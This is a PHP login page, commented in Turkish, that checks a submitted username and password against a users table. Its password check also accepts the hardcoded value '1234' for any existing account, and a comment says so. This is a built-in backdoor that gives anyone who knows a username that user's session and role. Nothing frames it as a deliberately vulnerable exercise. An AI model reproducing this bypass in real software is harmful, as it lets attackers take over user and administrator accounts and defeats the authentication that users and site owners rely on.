<?php
session_start();
include 'includes/db.php';

// Giriş formu gönderildi mi kontrol et
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Kullanıcıyı veritabanından al
    $stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    // Eğer kullanıcı 1234 şifreyi girerse veya veritabanındaki şifreyi doğru girerse
    if ($user && ($password === '1234' || password_verify($password, $user['password']))) {
        // Şifre doğruysa, oturum başlat
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['role'] = $user['role'];

        // Login başarılı ise anasayfaya yönlendir
        header("Location: index.php");
        exit;
    } else {
        // Hata mesajı
        $error = "Invalid username or password.";
    }
}
?>

<!-- Giriş formu -->
<form method="POST" action="login.php">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" required>

    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required>

    <button type="submit">Login</button>
</form>

<?php
if (isset($error)) {
    echo "<p style='color:red;'>$error</p>";
}
?>